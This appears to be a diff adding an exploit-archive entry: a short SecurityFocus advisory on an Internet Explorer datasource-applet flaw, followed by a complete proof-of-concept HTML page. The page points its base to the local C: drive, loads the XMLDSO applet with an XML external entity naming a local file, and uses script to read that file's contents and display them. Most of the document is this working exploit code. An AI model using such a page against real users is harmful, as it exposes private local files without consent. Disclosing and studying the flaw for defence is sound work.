@@ -1,0 +1,30 @@
+source: http://www.securityfocus.com/bid/5490/info
+
+A problem in Microsoft Internet Explorer could lead to the disclosure of sensitive information.
+
+Due to the design of the datasource applet, it may be possible for a user to view the contents of local files via a remote page. By building a custom-crafted page that specifies the code base as the local system, it would be possible to display the contents of known local files.
+
+<html>
+<head>
+<base href="file:///C:/">
+</head>
+<body>
+<applet code="com.ms.xml.dso.XMLDSO.class" width="0" height="0" id="xmldso" MAYSCRIPT="true">
+<?xml version="1.0"?>
+<!DOCTYPE file [
+<!ELEMENT file (#PCDATA) >
+<!ENTITY contents SYSTEM "file:///C:/jelmer.txt">
+]>
+<file>
+&contents;
+</file>
+</applet>
+<script language="javascript">
+setTimeout("showIt()",2000);
+function showIt() {
+var jelmer = xmldso.getDocument();
+alert(jelmer.Text);
+}
+</script>
+</body>
+</html>
